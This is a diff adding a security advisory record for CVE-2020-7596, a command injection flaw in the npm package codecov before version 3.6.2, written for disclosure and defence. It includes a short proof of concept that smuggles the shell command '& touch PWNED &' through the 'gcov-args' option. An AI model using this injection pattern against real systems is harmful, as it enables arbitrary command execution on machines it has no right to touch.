@@ -1,0 +1,40 @@
+---
+- id: snykio:npm:codecov:543183
+  title: Command Injection
+  description: |
+    [codecov][1] is a npm package for uploading reports to Codecov.
+
+    Affected versions of this package are vulnerable to Command Injection.
+    The value provided as part of the `gcov-args` argument is executed by
+    the `exec` function within lib/codecov.js.
+
+    ### PoC by JHU System Security Lab   {#poc-by-jhu-system-security-lab}
+
+        var root = require("codecov");
+        var args = {
+          "options": {
+            'gcov-args': "& touch PWNED &"
+          }
+        }
+        root.handleInput.upload(args, function(){}, function(){});
+
+
+
+    [1]: https://codecov.io
+  affected_package: codecov
+  vulnerable_versions:
+  - "<3.6.2"
+  severity: medium
+  package_manager: npm
+  cve:
+  - CVE-2020-7596
+  cwe:
+  - CWE-78
+  disclosed_date: 2020-01-08
+  created_date: 2020-01-24
+  last_modified_date: 2020-01-24
+  credit:
+  - JHU System Security Lab
+  references:
+  - https://github.com/codecov/codecov-node/commit/2f4eff90dd21e58dd56074dc4933b15a91373de6
+  source_url: https://snyk.io/vuln/SNYK-JS-CODECOV-543183
